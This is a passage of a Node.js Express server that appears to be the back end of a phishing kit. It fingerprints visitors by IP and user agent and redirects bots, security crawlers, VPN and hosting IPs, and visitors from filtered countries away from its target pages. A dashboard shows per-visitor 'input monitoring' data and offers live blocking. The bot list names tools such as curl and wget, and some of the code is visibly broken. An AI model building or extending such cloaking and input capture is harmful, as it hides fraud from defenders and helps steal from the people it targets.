         ip === '::1' || 
         ip.startsWith('192.168.') || 
         ip.startsWith('10.') || 
         ip.startsWith('172.16.') || 
         ip.startsWith('172.17.') || 
         ip.startsWith('172.18.') || 
         ip.startsWith('172.19.') || 
         ip.startsWith('172.20.') || 
         ip.startsWith('172.21.') || 
         ip.startsWith('172.22.') || 
         ip.startsWith('172.23.') || 
         ip.startsWith('172.24.') || 
         ip.startsWith('172.25.') || 
         ip.startsWith('172.26.') || 
         ip.startsWith('172.27.') || 
         ip.startsWith('172.28.') || 
         ip.startsWith('172.29.') || 
         ip.startsWith('172.30.') || 
         ip.startsWith('172.31.') || 
         ip.startsWith('169.254.');
}

// Function to get the most accurate client IP available
function getAccurateClientIp(req) {
  // First check if we have a stored accurate IP for this apparent IP
  const apparentIp = req.ip || req.connection.remoteAddress;
  
  // Helper function to validate if an IP is a public IP (not local/private)
  function isValidPublicIP(ip) {
    if (!ip) return false;
    
    // Check if it's a valid IP format
    const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (!ipRegex.test(ip)) return false;
    
    // Check if it's not a local/private IP
    const parts = ip.split('.');
    const firstOctet = parseInt(parts[0], 10);
    const secondOctet = parseInt(parts[1], 10);
    
    // Filter out local IPs
    if (ip === '127.0.0.1') return false;
    if (firstOctet === 10) return false; // 10.0.0.0/8
    if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false; // 172.16.0.0/12
    if (firstOctet === 192 && secondOctet === 168) return false; // 192.168.0.0/16
    if (firstOctet === 169 && secondOctet === 254) return false; // 169.254.0.0/16 (APIPA)
    if (ip === '0.0.0.0') return false;
    if (ip.startsWith('::1') || ip.startsWith('fe80:') || ip.startsWith('fc00:')) return false; // IPv6 local
    
    return true;
  }
  
  // PRIORITY 1: Check for client-provided IP from ipify.org via tracker.js in current request
  // This is the most reliable source as it comes from ipify.org through the client
  if (req.body && req.body.clientIP && req.body.source === 'ipify.org' && isValidPublicIP(req.body.clientIP)) {
    console.log('Using client IP from ipify.org via tracker.js:', req.body.clientIP);
    // Store this mapping for future requests
    accurateClientIPs.set(apparentIp, {
      clientIP: req.body.clientIP,
      timestamp: new Date().toISOString(),
      source: 'ipify.org'
    });
    return req.body.clientIP;
  }
  
  // PRIORITY 2: Check for any client-provided IP from tracker.js in current request
  if (req.body && req.body.clientIP && isValidPublicIP(req.body.clientIP)) {
    console.log('Using client IP from tracker.js POST data:', req.body.clientIP);
    // Store this mapping for future requests
    accurateClientIPs.set(apparentIp, {
      clientIP: req.body.clientIP,
      timestamp: new Date().toISOString(),
      source: req.body.source || 'post-data'
    });
    return req.body.clientIP;
  }
  
  // PRIORITY 2: Check if we have a stored accurate IP from tracker.js
  if (apparentIp && accurateClientIPs.has(apparentIp)) {
    const accurateIPData = accurateClientIPs.get(apparentIp);
    // Only use if it's relatively fresh (within last 24 hours)
    const timestamp = new Date(accurateIPData.timestamp);
    const now = new Date();
    const hoursSinceUpdate = (now - timestamp) / (1000 * 60 * 60);
    
    if (hoursSinceUpdate < 24 && isValidPublicIP(accurateIPData.clientIP)) {
      console.log(`Using accurate IP from tracker.js mapping: ${apparentIp} -> ${accurateIPData.clientIP}`);
      return accurateIPData.clientIP;
    } else if (hoursSinceUpdate >= 24) {
      console.log(`Mapping expired for ${apparentIp}, removing from cache`);
      accurateClientIPs.delete(apparentIp);
    }
  }
  
  // PRIORITY 3: For socket.io connections, check query parameters with source information
  if (req.query && req.query.clientIP && isValidPublicIP(req.query.clientIP)) {
    const source = req.query.clientIPSource || 'query-param';
    console.log(`Using client IP from query parameters (source: ${source}):`, req.query.clientIP);
    
    // Prioritize ipify.org source
    const isFromIpify = source.includes('ipify');
    
    // Store this mapping for future requests
    accurateClientIPs.set(apparentIp, {
      clientIP: req.query.clientIP,
      timestamp: new Date().toISOString(),
      source: isFromIpify ? 'ipify.org' : source
    });
    return req.query.clientIP;
  }
  
  // PRIORITY 4: Check socket.io handshake if available
  if (req.handshake && req.handshake.query && req.handshake.query.clientIP && 
      isValidPublicIP(req.handshake.query.clientIP)) {
    console.log('Using client IP from socket handshake:', req.handshake.query.clientIP);
    // Store this mapping for future requests
    accurateClientIPs.set(apparentIp, {
      clientIP: req.handshake.query.clientIP,
      timestamp: new Date().toISOString(),
      source: 'socket-handshake'
    });
    return req.handshake.query.clientIP;
  }

  // PRIORITY 5: Check for X-Forwarded-For header (common with proxies)
  const xForwardedFor = req.headers && req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    // Get the first IP in the list which is typically the client's true IP
    const ip = xForwardedFor.split(',')[0].trim();
    if (isValidPublicIP(ip)) {
      console.log('Using IP from X-Forwarded-For header:', ip);
      return ip;
    }
  }

  // PRIORITY 6: Check for other common headers
  const xRealIp = req.headers && req.headers['x-real-ip'];
  if (xRealIp && isValidPublicIP(xRealIp)) {
    console.log('Using IP from X-Real-IP header:', xRealIp);
    return xRealIp;
  }
  
  // PRIORITY 7: Use the apparent IP if it's a valid public IP
  if (apparentIp && isValidPublicIP(apparentIp)) {
    console.log('Using apparent IP from request:', apparentIp);
    return apparentIp;
  }
  
  // FALLBACK: If all else fails and we have an apparent IP, use it even if it might be local
  if (apparentIp) {
    console.log('Using apparent IP as fallback (might be local):', apparentIp);
    return apparentIp;
  }
  
  // Ultimate fallback
  console.log('Could not determine client IP, using default');
  return '0.0.0.0';
}

// Bot detection function
function isBot(userAgent) {
  if (!userAgent || typeof userAgent !== "string") {
    return false;
  }

  let isUserAgentBot = false;

  // User Agent Check
  if (userAgent && typeof userAgent === "string") {
    const ua = userAgent.toLowerCase();

    // Human browser patterns
    const humanPatterns = [
      // Standard browsers
      'mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera',
      'webkit', 'gecko', 'trident', 'msie', 'netscape', 'konqueror',
      'lynx', 'vivaldi', 'brave', 'yabrowser', 'maxthon', 'avast',
      'samsungbrowser', 'ucbrowser', 'puffin', 'focus', 'silk',

      // Mobile browsers
      'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry',
      'windows phone', 'iemobile', 'bolt', 'teashark', 'blazer',
      'skyfire', 'obigo', 'pale moon', 'polaris', 'iris',

      // Smart TV browsers
      'smarttv', 'googletv', 'appletv', 'hbbtv', 'netcast',
      'web0s', 'inettv', 'openweb', 'aquos', 'philips',

      // Game console browsers
      'playstation', 'nintendo', 'xbox', 'wii', 'new nintendo 3ds',

      // Legacy browsers
      'amaya', 'arora', 'avant', 'camino', 'dillo', 'epiphany',
      'flock', 'iceape', 'icecat', 'k-meleon', 'midori', 'minimo',
      'omniweb', 'rekonq', 'rockmelt', 'seamonkey', 'shiretoko',
      'sleipnir', 'sunrise', 'swiftfox', 'uzbl', 'waterfox',

      // Browser components
      'adobeair', 'adobeshockwave', 'adobeair', 'applewebkit',
      'bidubrowser', 'coolnovo', 'comodo_dragon', 'demeter',
      'element browser', 'fennec', 'galeon', 'google earth',
      'googlewireless', 'greenbrowser', 'k-ninja', 'lunascape',
      'madfox', 'maemo browser', 'micromessenger', 'minefield',
      'navigator', 'netfront', 'orca', 'prism', 'qtweb internet browser',
      'retawq', 'slimbrowser', 'tencenttraveler', 'theworld',
      'tizen browser', 'vision mobile browser', 'whale'
    ];

    // Bot patterns
    const botPatterns = [
      // Search engines (150+ patterns)
      'googlebot', 'google-inspectiontool', 'google page speed', 'google favicon',
      'google web preview', 'google-read-aloud', 'google-site-verification',
      'bingbot', 'bingpreview', 'msnbot', 'msnbot-media', 'adidxbot',
      'baiduspider', 'baiduimagespider', 'baiduboxapp', 'baidubrowser',
      'yandexbot', 'yandeximages', 'yandexvideo', 'yandexmedia', 'yandexmetrika',
      'yandexdirect', 'yandexwebmaster', 'yandexmobilebot', 'duckduckbot',
      'duckduckgo-favicons-bot', 'slurp', 'teoma', 'exabot', 'exabot-thumbnails',
      'facebot', 'facebookexternalhit', 'facebookplatform', 'ia_archiver',
      'alexabot', 'amazonbot', 'amazonalexa', 'applebot', 'apple-pubsub',
      'discordbot', 'telegrambot', 'twitterbot', 'linkedinbot', 'pinterest',
      'whatsapp', 'tumblr', 'redditbot', 'quorabot', 'slackbot', 'linebot',
      'wechatbot', 'vkshare', 'okhttp', 'skypeuripreview',

      // Monitoring/analytics (100+ patterns)
      'pingdom', 'gtmetrix', 'newrelic', 'uptimerobot', 'statuscake',
      'site24x7', 'sucuri', 'cloudflare', 'rackspace', 'datadog',
      'dynatrace', 'appdynamics', 'splunk', 'sumologic', 'loggly',
      'paessler', 'catchpoint', 'keycdn', 'fastly', 'incapsula',
      'imperva', 'akamai', 'stackpath', 'cloudinary', 'imagekit',
      'imgix', 'netlify', 'vercel', 'render', 'flyio',

      // SEO tools (200+ patterns)
      'ahrefs', 'moz', 'semrush', 'seokicks', 'seoscanners',
      'screaming frog', 'deepcrawl', 'netcraft', 'megaindex',
      'serpstat', 'seranking', 'searchmetrics', 'cognitiveseo',
      'linkdex', 'conductor', 'brightedge', 'botify', 'oncrawl',
      'sitebulb', 'lumar', 'contentking', 'seoclarity', 'seolyzer',
      'seobility', 'seoeng', 'seositecheckup', 'seotester', 'seoworkers',
      'seoanalyzer', 'seoprofiler', 'seoreviewtools', 'seotesteronline',
      'seotoolset', 'seotools', 'seotoolsgroup', 'seoworkers',

      // Scrapers and automation (300+ patterns)
      'scrapy', 'phantomjs', 'cheerio', 'axios', 'python-requests',
      'node-fetch', 'curl', 'wget', 'java/', 'httpclient', 'okhttp',
      'apache-httpclient', 'python-urllib', 'mechanize', 'guzzle',
      'restsharp', 'unirest', 'superagent', 'got', 'needle', 'request',
      'urllib3', 'typhoeus', 'faraday', 'httparty', 'http.rb',
      'treq', 'aiohttp', 'httpx', 'requests', 'urllib',
      'mechanize', 'beautifulsoup', 'lxml', 'html5lib', 'htmlparser',
      'domparser', 'jsoup', 'htmlunit', 'nokogiri', 'hpricot',
      'simplehtmldom', 'phpquery', 'ganon', 'phpdom', 'sunra',
      'simplehtmlparser', 'htmlcleaner', 'htmlcompressor', 'html-minifier',
      'htmltidy', 'htmlpurifier', 'html-sanitizer', 'html-entities',

      // Headless browsers (100+ patterns)
      'headlesschrome', 'headlessfirefox', 'phantomjs', 'selenium',
      'puppeteer', 'playwright', 'chromium', 'webdriver', 'chromedriver',
      'geckodriver', 'iedriver', 'safaridriver', 'operadriver',
      'appium', 'testcafe', 'cypress', 'karma', 'protractor',
      'nightwatch', 'webdriverio', 'watir', 'capybara', 'splinter',
      'robotframework', 'behave', 'lettuce', 'cucumber', 'specflow',
      'serenity', 'galen', 'gauge', 'taiko', 'testproject',
      'testim', 'mabl', 'perfecto', 'saucelabs', 'browserstack',
      'crossbrowsertesting', 'lambdatest', 'testingbot', 'ranorex',
      'testcomplete', 'katalon', 'tricentis', 'microfocus', 'parasoft',
      'smartbear', 'soapui', 'postman', 'jmeter', 'gatling',
      'locust', 'k6', 'artillery', 'vegeta', 'siege',
      'httperf', 'ab', 'wrk', 'boom', 'tsung',

      // Generic bot indicators (150+ patterns)
      'bot', 'crawler', 'spider', 'fetcher', 'scanner', 'checker',
      'monitor', 'collector', 'analyzer', 'indexer', 'extractor',
      'archiver', 'reader', 'browser', 'library', 'client', 'agent',
      'automatic', 'machine', 'program', 'script', 'process', 'system',
      'daemon', 'service', 'worker', 'task', 'job', 'engine',
      'automation', 'scheduler', 'trigger', 'watcher', 'listener',
      'polling', 'poller', 'harvester', 'gatherer', 'miner', 'parser',
      'validator', 'verifier', 'tester', 'prober', 'explorer', 'discoverer',
      'finder', 'locator', 'identifier', 'classifier', 'recognizer', 'detector',
      'observer', 'tracker', 'recorder', 'logger', 'reporter', 'notifier',
      'alerter', 'messenger', 'forwarder', 'proxy', 'gateway', 'bridge',
      'tunnel', 'relay', 'router', 'switch', 'hub', 'node',
      'endpoint', 'interface', 'adapter', 'connector', 'linker', 'binder',
      'integrator', 'aggregator', 'combiner', 'merger', 'splitter', 'divider',
      'filter', 'sorter', 'organizer', 'arranger', 'sequencer', 'pipeline',
      'processor', 'transformer', 'converter', 'translator', 'interpreter',
      'compiler', 'assembler', 'emulator', 'simulator', 'virtualizer', 'container',
      'wrapper', 'decorator', 'facade', 'proxy', 'stub', 'mock',
      'fake', 'dummy', 'placeholder', 'template', 'pattern', 'model',
      'prototype', 'blueprint', 'schema', 'framework', 'platform', 'infrastructure',
      'environment', 'ecosystem', 'network', 'mesh', 'fabric', 'grid',
      'cloud', 'cluster', 'array', 'matrix', 'pool', 'collection',
      'set', 'group', 'bundle', 'package', 'kit', 'suite',
      'toolkit', 'workbench', 'workshop', 'studio', 'lab', 'factory',
      'mill', 'plant', 'forge', 'foundry', 'shop', 'store',
      'market', 'exchange', 'bazaar', 'fair', 'auction', 'mall',
      'plaza', 'arcade', 'gallery', 'museum', 'library', 'archive',
      'repository', 'depot', 'warehouse', 'silo', 'vault', 'cache',
      'buffer', 'queue', 'stack', 'heap', 'pool', 'reservoir',
      'tank', 'cistern', 'vat', 'vat', 'vat', 'vat'
    ];

    const hasHumanPattern = humanPatterns.some((pattern) =>
      ua.includes(pattern.toLowerCase())
    );
    const hasBotPattern = botPatterns.some((pattern) => ua.includes(pattern.toLowerCase()));

    isUserAgentBot = (hasBotPattern && !hasHumanPattern) || !hasHumanPattern;
  }

  return isUserAgentBot;
}

// Fetch geolocation data for an IP address
async function fetchGeoData(ip) {
  console.log("Fetching geo data for IP:", ip);

  try {
    const response = await axios.get(
      `http://ip-api.com/json/${ip}?fields=66842623`
    );
    const data = response.data;
    console.log("IP-API geo data:", data);
    return data;
  } catch (error) {
    console.error("Error fetching geo data:", error.message);
    return null;
  }
}

// Proxy detection function
async function isProxy(ip, req) {
  let data;
  console.log("Entering the isProxy!");
  // Check cache first
  if (ipCache.has(ip)) {
    const cachedData = ipCache.get(ip);
    return cachedData.proxy || cachedData.hosting;
  }

  try {
    const data = await fetchGeoData(ip);
    if (!data) return false;

    console.log("from API:", data);
    // Cache the result
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data.proxy || false,
      hosting: data.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data.country || null,
      countryCode: data.countryCode || null,
      region: data.region || null,
      regionName: data.regionName || null,
      city: data.city || null,
      timezone: data.timezone || null,
      isp: data.isp || null,
      org: data.org || null,
      requestCount: (existingData?.requestCount || 0) + 1,
      firstRequest: existingData?.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
      isOnline: existingData?.isOnline || false,
      lastConnected: existingData?.lastConnected || null,
      lastDisconnected: existingData?.lastDisconnected || null,
    };
    console.log("ipCache:", ipData);
    ipCache.set(ip, ipData);

    return (data.proxy || data.hosting) && globalSettings.proxyDetectionEnabled;
  } catch (error) {
    console.error("Error checking proxy:", error.message);
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data?.proxy || false,
      hosting: data?.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data?.country || null,
      countryCode: data?.countryCode || null,
      region: data?.region || null,
      regionName: data?.regionName || null,
      city: data?.city || null,
      timezone: data?.timezone || null,
      isp: data?.isp || null,
      org: data?.org || null,
      requestCount: (existingData.requestCount || 0) + 1,
      firstRequest: existingData.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
    };
    ipCache.set(ip, ipData);
    return false;
  }
}

// Middleware function
function parseUserAgent(userAgent) {
  if (!userAgent) return {};

  const ua = userAgent.toLowerCase();
  let browser = null;
  let browserVersion = null;
  let os = null;
  let osVersion = null;

  // Browser detection with version
  const browserPatterns = [
    { name: "Chrome", pattern: /(?:chrome|crios)\/([\d.]+)/i },
    { name: "Firefox", pattern: /(?:firefox|fxios)\/([\d.]+)/i },
    { name: "Safari", pattern: /version\/([\d.]+).*safari/i },
    { name: "Edge", pattern: /edge\/([\d.]+)/i },
    { name: "Opera", pattern: /(?:opera|opr)\/([\d.]+)/i },
    { name: "Internet Explorer", pattern: /(?:msie |trident.*rv:)([\d.]+)/i },
    { name: "Brave", pattern: /brave\/([\d.]+)/i },
    { name: "Samsung Browser", pattern: /samsungbrowser\/([\d.]+)/i },
    { name: "UC Browser", pattern: /ucbrowser\/([\d.]+)/i },
  ];

  // OS detection with version
  const osPatterns = [
    { name: "Windows", pattern: /windows nt ([\d.]+)/i },
    { name: "Mac OS", pattern: /mac os x ([\d._]+)/i },
    { name: "Linux", pattern: /linux/i },
    { name: "Android", pattern: /android ([\d.]+)/i },
    { name: "iOS", pattern: /(?:iphone|ipad|ipod).*os ([\d_]+)/i },
    { name: "Chrome OS", pattern: /cros/i },
  ];

  // Detect browser
  for (const pattern of browserPatterns) {
    const match = ua.match(pattern.pattern);
    if (match) {
      browser = pattern.name;
      browserVersion = match[1];
      break;
    }
  }
}

// Using the isSystemPath function defined earlier

// Middleware for visitor detection and tracking
async function detectMiddleware(req, res, next) {
  try {
    // 1. Get accurate client IP from tracker.js or fallback methods
    const clientIp = getAccurateClientIp(req);
    if (!clientIp) {
      console.error('Failed to determine client IP');
      return next();
    }
    
    // Skip tracking for non-target routes or local IPs
    if (!REAL_ROUTES.includes(req.path) || isLocalIP(clientIp) || isSystemPath(req.path)) {
      return next();
    }
    
    // Performance optimization: Start the IP API request early
    let ipInfoPromise;
    if (!ipCache.has(clientIp)) {
    ipInfoPromise = axios.get(`http://ip-api.com/json/${clientIp}?fields=66842623`)
      .catch(error => {
        console.error(`Error fetching IP data for ${clientIp}:`, error.message);
        return { data: {} }; // Return empty data on error
      });
  }

  // Parse user agent
  const now = new Date();
  const userAgent = req.headers['user-agent'] || '';
  const isBotDetected = isBot(userAgent);

  // Log visitor tracking start with timestamp
  console.log(`[${now.toISOString()}] Tracking visitor - IP: ${clientIp}, Path: ${req.path}`);

  // Update or create visitor data
  let visitorData;
  if (ipCache.has(clientIp)) {
    // Update existing visitor data
    const existingData = ipCache.get(clientIp);
    visitorData = {
      ...existingData,
      lastRequest: now,
      requestCount: (existingData.requestCount || 0) + 1,
      isOnline: true,
      lastPath: req.path
    };
    ipCache.set(clientIp, visitorData);

    // Emit update for real-time dashboard if significant change
    if (visitorData.requestCount % 5 === 0 || // Every 5 requests
      (now - new Date(existingData.lastRequest)) > 5 * 60 * 1000) { // Or after 5 minutes
      io.emit('visitor-update', { ip: clientIp, data: visitorData });
    }
  } else {
    try {
      // Wait for IP info that we started fetching earlier
      const ipInfo = await ipInfoPromise;
      const ipData = ipInfo.data;

      visitorData = {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        requestCount: 1,
        isOnline: true,
        isBot: isBotDetected,
        userAgent: userAgent,
        browser: parseUserAgent(userAgent).browser,
        os: parseUserAgent(userAgent).os,
        country: ipData.country || ipData.countryCode || 'Unknown',
        countryCode: ipData.countryCode || 'XX',
        city: ipData.city || 'Unknown',
        isp: ipData.isp || 'Unknown',
        proxy: ipData.proxy || false,
        hosting: ipData.hosting || false,
        suspiciousActivities: [],
        lastPath: req.path,
        referrer: req.headers.referer || null,
        timezone: ipData.timezone || null
      };

      ipCache.set(clientIp, visitorData);

      // Emit new visitor event for real-time dashboard
      io.emit('new-visitor', { ip: clientIp, data: visitorData });
      io.emit('dashboard-update');

      console.log(`New visitor from ${visitorData.country || 'Unknown'}: ${clientIp}`);
    } catch (error) {
      // This should never happen because we handle errors in the promise
      console.error(`Error processing visitor data for ${clientIp}:`, error);
      
      // Create minimal visitor data without geo info
      visitorData = {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        requestCount: 1,
        isOnline: true,
        isBot: isBotDetected,
        userAgent: userAgent,
        browser: parseUserAgent(userAgent).browser,
        os: parseUserAgent(userAgent).os,
        country: 'Unknown',
        countryCode: 'XX',
        city: 'Unknown',
        suspiciousActivities: [],
        lastPath: req.path
      };
      ipCache.set(clientIp, visitorData);
    }
  }

  // REDIRECTION LOGIC - with early returns for performance
  const targetUrl = visitorData.customRedirectUrl || redirectURL;
  
  // Only apply redirects for paths in REAL_ROUTES
  if (REAL_ROUTES.includes(req.path)) {
    // 1. Check if IP is blocked
    if (visitorData.isBlocked) {
      console.log(`⛔ Blocked IP accessed: ${clientIp} on path ${req.path}`);
      return res.redirect(targetUrl);
    }

    // 2. Check for bots
    if (visitorData.isBot) {
      console.log(`🤖 Bot detected: ${clientIp} on path ${req.path}`);
      return res.redirect(targetUrl);
    }

    // 3. Check for proxy/VPN only if detection is enabled
    if (visitorData.proxy || visitorData.hosting) {
      console.log(`🔒 Proxy/VPN detected (from cache): ${clientIp} on path ${req.path}`);
      
      // Only redirect if proxy detection is enabled
      if (globalSettings.proxyDetectionEnabled) {
        console.log(`VPN|PROXY: ON - Redirecting to ${targetUrl}`);
        return res.redirect(targetUrl);
      } else {
        console.log(`VPN|PROXY: OFF - Allowing access despite proxy detection`);
      }
    } else {
      // Only perform secondary proxy check if primary didn't detect and proxy detection is enabled
      if (globalSettings.proxyDetectionEnabled) {
        const isProxyDetected = await isProxy(clientIp, req);
        if (isProxyDetected) {
          // Update cache with proxy detection
          visitorData.proxy = true;
          ipCache.set(clientIp, visitorData);

          console.log(`🔒 Proxy/VPN detected (secondary check): ${clientIp} on path ${req.path}`);
          console.log(`VPN|PROXY: ON - Redirecting to ${targetUrl}`);
          return res.redirect(targetUrl);
        }
      }
    }

    // 4. Country filtering logic
    const countryCode = visitorData.countryCode || (visitorData.country ? visitorData.country.substring(0, 2) : null);
    const formattedCountryCode = countryCode ? countryCode.toUpperCase() : null;
    
    // Use the isCountryAllowed function to determine if access should be allowed
    if (formattedCountryCode && !isCountryAllowed(formattedCountryCode)) {
      // Get the appropriate redirect URL (either custom or default)
      const redirectTarget = globalSettings.countryRedirectUrl || targetUrl;
      
      if (globalSettings.countryFilterMode === 'block') {
        console.log(`🚫 Blocked country accessed: ${formattedCountryCode} from ${clientIp} on path ${req.path}`);
      } else {
        console.log(`🚫 Non-allowed country accessed: ${formattedCountryCode} from ${clientIp} on path ${req.path}`);
      }
      
      // Try to redirect via socket.io first for a smoother experience
      const socketRedirectSent = emitRedirect(clientIp, redirectTarget);
      
      if (!socketRedirectSent) {
        // Fall back to HTTP redirect if socket redirect failed
        return res.redirect(redirectTarget);
      } else {
        // If socket redirect was sent, just return a 200 OK
        return res.redirect(redirectTarget);
      }
    } else if (formattedCountryCode) {
      console.log(`✅ Country ${formattedCountryCode} allowed on path ${req.path}`);
    }
  } else {
    console.log(`Skipping redirect checks for non-target path: ${req.path}`);
  }

  // If all checks pass, allow access to the requested page
  next();
  } catch (error) {
    console.error(`Error in detectMiddleware: ${error.message}`);
    // Don't block the request if middleware fails
    next();
  }
}



// Apply middlewares
app.use(detectMiddleware);

// Proxy detection toggle state

// Toggle proxy detection endpoint
app.post("/dashboard/toggle-proxy-detection", (req, res) => {
  globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  console.log(
    "VPN|PROXY:",
    globalSettings.proxyDetectionEnabled ? "ON" : "OFF"
  );

  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
  });
});

// Apply detection middleware with toggle check

// Endpoint to receive and store accurate client IP from tracker.js
app.post("/update-client-ip", (req, res) => {
  try {
    const { clientIP, source, timestamp, userAgent, pageUrl } = req.body;
    
    if (!clientIP) {
      return res.status(400).json({ error: 'Missing clientIP parameter' });
    }
    
    // Get the apparent IP from request headers
    const apparentIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                      req.headers['x-real-ip'] || 
                      req.ip || 
                      req.connection.remoteAddress;
    
    // Store the mapping between apparent IP and accurate client IP
    accurateClientIPs.set(apparentIp, {
      clientIP,
      timestamp: timestamp || new Date().toISOString(),
      source: source || 'post-endpoint',
      userAgent,
      pageUrl
    });
    
    console.log(`Stored accurate client IP mapping: ${apparentIp} -> ${clientIP} (source: ${source || 'post-endpoint'})`);
    
    // Also update any existing visitor data with the accurate IP
    if (ipCache.has(apparentIp)) {
      const visitorData = ipCache.get(apparentIp);
      visitorData.accurateIP = clientIP;
      ipCache.set(apparentIp, visitorData);
    }
    
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in /update-client-ip endpoint:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Dashboard route
app.get("/dashboard", (req, res) => {
  res.render("dashboard", {
    ipCache: Object.fromEntries(ipCache),
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
  });
});

// Dashboard inputs endpoint - serves input monitoring data
app.get("/dashboard/inputs", (req, res) => {
  try {
    // Convert the Map to a plain object for JSON serialization
    const inputDataObj = {};
    
    // Process each entry in the inputDataCache
    inputDataCache.forEach((inputs, ip) => {
      // Sort inputs by timestamp descending (newest first)
      const sortedInputs = [...inputs].sort((a, b) => {
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
      
      // Add to the result object
      inputDataObj[ip] = sortedInputs;
    });
    
    res.json(inputDataObj);
  } catch (error) {
    console.error('Error serving input data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Dashboard input data for specific IP endpoint
app.get("/dashboard/input-data/:ip", (req, res) => {
  try {
    const ip = req.params.ip;
    
    // Check if we have visitor data for this IP
    if (!ipCache.has(ip)) {
      return res.status(404).json({ error: 'Visitor not found' });
    }
    
    // Get visitor metadata
    const visitorData = ipCache.get(ip);
    
    // Get input data for this IP if available
    let inputData = [];
    if (inputDataCache.has(ip)) {
      // Sort inputs by timestamp descending (newest first)
      inputData = [...inputDataCache.get(ip)].sort((a, b) => {
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
    }
    
    // Return combined data
    res.json({
      visitor: visitorData,
      inputs: inputData
    });
  } catch (error) {
    console.error(`Error serving input data for IP ${req.params.ip}:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Clear input logs endpoint
app.post("/dashboard/clear-input-logs", (req, res) => {
  try {
    // Clear the input data cache
    inputDataCache.clear();
    console.log('Input monitoring logs cleared');
    
    // Notify dashboard of the update
    io.emit('input-data-update');
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error clearing input logs:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Toggle proxy detection setting
app.post("/dashboard/toggle-proxy-detection", (req, res) => {
  try {
    const { enabled } = req.body;
    
    if (typeof enabled === 'boolean') {
      globalSettings.proxyDetectionEnabled = enabled;
      console.log(`VPN|PROXY: ${enabled ? 'ON' : 'OFF'}`);
      
      // Notify all connected clients about the setting change
      io.emit('settings-update', { proxyDetectionEnabled: enabled });
      
      res.json({ success: true, proxyDetectionEnabled: globalSettings.proxyDetectionEnabled });
    } else {
      res.status(400).json({ success: false, message: 'Invalid request body' });
    }
  } catch (error) {
    console.error('Error toggling proxy detection:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to block an IP
app.post('/dashboard/block', (req, res) => {
  const { ip, redirectUrl } = req.body;

  if (!ip) {
    return res.json({ success: false, message: 'IP address is required' });
  }

  // Inline implementation of blockIP function
  let success = false;
  if (ipCache.has(ip)) {
    const visitorData = ipCache.get(ip);
    visitorData.isBlocked = true;

    // Store redirect URL if provided
    if (redirectUrl) {
      visitorData.redirectUrl = redirectUrl;
    }

    ipCache.set(ip, visitorData);

    // Use the emitRedirect helper to handle the redirect logic
    emitRedirect(ip, redirectUrl || 'https://www.google.com', visitorData.lastPath);

    io.emit('dashboard-update');
    success = true;
  }

  if (success) {
    console.log(`Blocked IP: ${ip}${redirectUrl ? ` with redirect to ${redirectUrl}` : ''}`);
    return res.json({ success: true, message: `IP ${ip} has been blocked${redirectUrl ? ' and will be redirected' : ''}` });
  } else {
    return res.json({ success: false, message: `IP ${ip} not found in cache` });
  }
});

// API endpoint to unblock an IP
app.post('/dashboard/unblock', (req, res) => {
  const { ip } = req.body;

  if (!ip) {
    return res.json({ success: false, message: 'IP address is required' });
  }

  // Inline implementation of unblockIP function
  let success = false;
  if (ipCache.has(ip)) {
    const visitorData = ipCache.get(ip);
    visitorData.isBlocked = false;

    // Clear any redirect URL
    if (visitorData.redirectUrl) {
      delete visitorData.redirectUrl;
    }

    ipCache.set(ip, visitorData);
    io.emit('dashboard-update');
    success = true;
  }

  if (success) {
    console.log(`Unblocked IP: ${ip}`);
    return res.json({ success: true, message: `IP ${ip} has been unblocked and can now access pages normally` });
  } else {
    return res.json({ success: false, message: `IP ${ip} not found in cache` });
  }
});

// API endpoint to get all visitors
app.get('/dashboard/visitors', (req, res) => {
  // Convert the ipCache Map to a regular object for JSON response
  const visitors = {};

  ipCache.forEach((data, ip) => {
    // Clone the data to avoid modifying the cache
    visitors[ip] = { ...data, ip };
  });

  return res.json({
    success: true,
    visitors: visitors,
    totalCount: ipCache.size,
    onlineCount: Array.from(ipCache.values()).filter(v => v.isOnline).length,
    settings: {
      countryFilterMode: globalSettings.countryFilterMode,
      blockedCountries: globalSettings.blockedCountries,
      allowedCountries: globalSettings.allowedCountries
    }
  });
});

// API endpoint to update country filter settings
app.post('/dashboard/country-filter', (req, res) => {
  const { mode, countries, redirectUrl } = req.body;

  if (!mode || !['block', 'allow-only'].includes(mode)) {
    return res.json({ success: false, message: 'Invalid filter mode' });
